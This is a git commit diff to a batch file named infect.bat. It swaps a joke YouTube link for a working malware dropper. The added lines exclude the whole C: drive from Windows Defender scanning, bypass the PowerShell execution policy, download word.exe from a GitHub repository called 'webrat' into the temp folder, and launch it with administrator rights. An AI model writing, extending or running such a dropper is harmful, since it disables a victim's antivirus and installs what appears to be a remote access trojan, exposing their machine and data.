05760ef268c1ea793d0a70ac6cfbaf4b5184af15
Oxapayy <oxapay@l0r3nt.cc>
2026-03-09 01:33:49 +0100

    Update infect.bat

--- infect.bat
+++ infect.bat
@@ -1,4 +1,10 @@
 @echo off
-start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+powershell.exe -Command Add-MpPreference -ExclusionPath "C:/"
+setlocal EnableDelayedExpansion
+set "URL=https://raw.githubusercontent.com/Oxapayy/webrat/refs/heads/main/word.exe"
+set "Datei=%TEMP%\word.exe"
+powershell -NoLogo -ExecutionPolicy Bypass -Command ^
+    "Invoke-WebRequest -UseBasicParsing -Uri '%URL%' -OutFile '%Datei%'"
+cd "C:\Users\%USERNAME%\AppData\Local\Temp"
+powershell -Command "Start-Process 'C:\Users\%USERNAME%\AppData\Local\Temp\word.exe' -Verb RunAs"
 exit
-
